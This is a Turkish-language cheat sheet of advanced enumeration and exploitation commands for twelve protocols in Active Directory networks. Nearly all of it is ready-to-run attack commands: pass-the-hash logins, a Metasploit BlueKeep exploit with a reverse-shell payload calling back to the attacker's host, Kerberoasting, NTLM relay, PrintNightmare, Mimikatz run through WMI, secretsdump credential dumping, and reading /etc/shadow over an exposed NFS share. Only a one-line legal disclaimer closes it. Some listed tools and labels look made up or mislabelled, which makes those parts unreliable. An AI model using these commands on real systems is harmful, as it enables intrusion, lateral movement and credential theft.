# AD Ortamında 12 Protokolün Gelişmiş Düzeyde Enumeration ve Exploitation Rehberi

Bu rehber, Active Directory ortamında RDP, WinRM, LDAP, NFS, VNC, SMB, WMI, FTP, SSH, MSSQL, RPC ve SNMP protokollerine yönelik ileri seviye enumeration ve exploitation tekniklerini kapsamaktadır.

---

## 1. Remote Desktop Protocol (RDP)
### Gelişmiş Enumeration
**CredSSP Zafiyetlerini Kontrol Etme:**
```bash
nmap -p 3389 --script rdp-ntlm-info <hedef-ip>
```
**Açık Oturumları Kontrol Etme:**
```bash
rdp-sec-check.py -t <hedef-ip>
```

### Gelişmiş Exploitation
**xfreerdp ile Pass-the-Hash Saldırısı:**
```bash
xfreerdp /u:<kullanıcı-adı> /d:<domain> /pth:<NTLM hash> /v:<hedef-ip>
```
**BlueKeep Remote Code Execution:**
```bash
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <hedef-ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <kendi-ip>
run
```

---

## 2. Windows Remote Management (WinRM)
### Gelişmiş Enumeration
**WinRM Kullanılabilir Kimlik Doğrulama Yöntemlerini Tespit Etme:**
```bash
nmap -p 5985,5986 --script http-auth --script-args http-auth.path="/wsman",http-auth.method=auto <hedef-ip>
```
**Evil-WinRM ile Kullanılabilir Komutları Listeleme:**
```bash
evil-winrm -i <hedef-ip> -u <kullanıcı-adı> -p <şifre> -e /path/to/extensions
```

### Gelişmiş Exploitation
**Kerberos Tabanlı Exploitation:**
```bash
impacket-wmiexec -k -no-pass <kullanıcı-adı>@<hedef-ip>
```
**Post-Exploitation Komut Çalıştırma:**
```bash
evil-winrm -i <hedef-ip> -u <kullanıcı-adı> -H <NTLM hash> -p <şifre>
```

---

## 3. Lightweight Directory Access Protocol (LDAP)
### Gelişmiş Enumeration
**Gizli Nesneleri Listeleme:**
```bash
ldapsearch -x -h <hedef-ip> -D "<kullanıcı-adı>" -w <şifre> -b "CN=Configuration,DC=ornek,DC=com" | grep -i "AdminCount"
```
**Kullanıcı Parola Politikasını Çıkarma:**
```bash
ldapdomaindump -u <kullanıcı-adı> -p <şifre> ldap://<hedef-ip>
```

### Gelişmiş Exploitation
**Kerberoasting:**
```bash
GetUserSPNs.py -request -dc-ip <hedef-ip> <domain>/<kullanıcı-adı> -outputfile hashes.txt
```
**Zayıf İzinleri Kötüye Kullanma:**
```bash
adexplorer.exe <LDAP URL>
```

---

## 4. Network File System (NFS)
### Gelişmiş Enumeration
**Paylaşılan Dosya Sistemlerini Tarama:**
```bash
rpcinfo -p <hedef-ip>
```
**Dosya İzinlerini Analiz Etme:**
```bash
nfs-ls <hedef-ip>:/paylasilan_path
```

### Gelişmiş Exploitation
**NFS Yanlış Yapılandırması ile Ayrıcalık Yükseltme:**
```bash
mount -t nfs -o nolock <hedef-ip>:/ /mnt/nfs
cd /mnt/nfs
cat /etc/shadow
```

---

## 5. Virtual Network Computing (VNC)
### Gelişmiş Enumeration
**Kimlik Doğrulama Atlamasını Kontrol Etme:**
```bash
vncviewer -passwd none <hedef-ip>
```
**Şifreleme Seviyelerini Analiz Etme:**
```bash
nmap -p 5900 --script vnc-info,vnc-title <hedef-ip>
```

### Gelişmiş Exploitation
**Kimlik Bilgisi Yeniden Oynatma Saldırısı:**
```bash
vncpwn <hedef-ip> <port> <kimlik-bilgileri>
```
**VNC Enjeksiyonu Başlatma:**
```bash
vnc-inject.py -t <hedef-ip> -c "cmd.exe"
```

---

## 6. Server Message Block (SMB)
### Gelişmiş Enumeration
**Yazılabilir Paylaşımları Listeleme:**
```bash
smbmap -H <hedef-ip> -u <kullanıcı-adı> -p <şifre>
```
**SMB Signing Tarama:**
```bash
crackmapexec smb <hedef-ip> --gen-relay-list relay_hosts.txt
```

### Gelişmiş Exploitation
**NTLM Relay Saldırısı:**
```bash
ntlmrelayx.py -tf relay_hosts.txt -smb2support
```
**PrintNightmare Exploit:**
```bash
impacket-printnightmare <hedef-ip> "\paylasim\path"
```

---

## 7. Windows Management Instrumentation (WMI)
### Gelişmiş Enumeration
**Aktif Oturumları Kontrol Etme:**
```bash
wmic /node:"<hedef-ip>" computersystem get username
```
**Impacket ile Sistem Bilgilerini Toplama:**
```bash
wmiexec.py <kullanıcı-adı>:<şifre>@<hedef-ip>
```

### Gelişmiş Exploitation
**Uzaktan PowerShell Çalıştırma:**
```bash
wmiexec.py <kullanıcı-adı>:<şifre>@<hedef-ip> "powershell.exe -Command \"Invoke-Mimikatz\""
```
**WMI Tabanlı Yanal Hareket:**
```bash
smbexec.py <kullanıcı-adı>:<şifre>@<hedef-ip>
```

---

## 8. File Transfer Protocol (FTP)
### Gelişmiş Enumeration
**Yazılabilir Dizini Belirleme:**
```bash
ftp <hedef-ip>
> dir
```
**Yanlış Yapılandırmaları Kontrol Etme:**
```bash
nmap -p 21 --script ftp-vsftpd-backdoor,ftp-anon <hedef-ip>
```

### Gelişmiş Exploitation
**FTP Backdoor Exploiti:**
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <hedef-ip>
run
```

---

## 9. Secure Shell (SSH)
### Gelişmiş Enumeration
**Anahtar Değişim Yöntemlerini Analiz Etme:**
```bash
ssh-audit <hedef-ip>
```
**Zayıf Yapılandırmaları Tespit Etme:**
```bash
nmap -p 22 --script ssh2-enum-algos <hedef-ip>
```

### Gelişmiş Exploitation
**Kimlik Bilgisi Yeniden Oynatma Saldırısı:**
```bash
ssh -i <ozel-anahtar> <kullanıcı-adı>@<hedef-ip>
```
**SSH Agent Hijacking:**
```bash
ssh-agent -s
```

---

## 10. Microsoft SQL Server (MSSQL)
### Gelişmiş Enumeration
**Veritabanı Bilgilerini Sorgulama:**
```bash
sqsh -S <hedef-ip> -U <kullanıcı-adı> -P <şifre>
SELECT name FROM sys.databases;
```
**Bağlı Sunucuları Listeleme:**
```sql
EXEC sp_linkedservers;
```

### Gelişmiş Exploitation
**xp_cmdshell Exploiti:**
```sql
EXEC xp_cmdshell 'whoami';
```
**SQL Enjeksiyonu ile Veri Çalma:**
```sql
SELECT * FROM openquery(linkedserver, 'SELECT data FROM table');
```

---

## 11. Remote Procedure Call (RPC)
### Gelişmiş Enumeration
**RPC Servislerini Listeleme:**
```bash
rpcdump.py <hedef-ip>
```
**Ayrıcalık Seviyelerini Kontrol Etme:**
```bash
rpcclient -U "<kullanıcı-adı>%<şifre>" <hedef-ip>
> querydominfo
```

### Gelişmiş Exploitation
**RPC ile Parola Dökme:**
```bash
secretsdump.py <kullanıcı-adı>:<şifre>@<hedef-ip>
```

---

## 12. Simple Network Management Protocol (SNMP)
### Gelişmiş Enumeration
**Tüm MIB Ağacını Dökme:**
```bash
snmpwalk -v 2c -c public <hedef-ip> .1
```
**SNMPv3 Yanlış Yapılandırmalarını Kontrol Etme:**
```bash
snmp-check <hedef-ip>
```

### Gelişmiş Exploitation
**Community String Saldırısı:**
```bash
onesixtyone -c community.txt <hedef-ip>
```
**SNMP Relay Saldırısı:**
```bash
snmp-relay.py -t <hedef-ip>
```

---

Bu teknikleri kullanmadan önce yasal izinleriniz olduğundan emin olun. Yetkisiz faaliyetler ciddi cezalara neden olabilir.
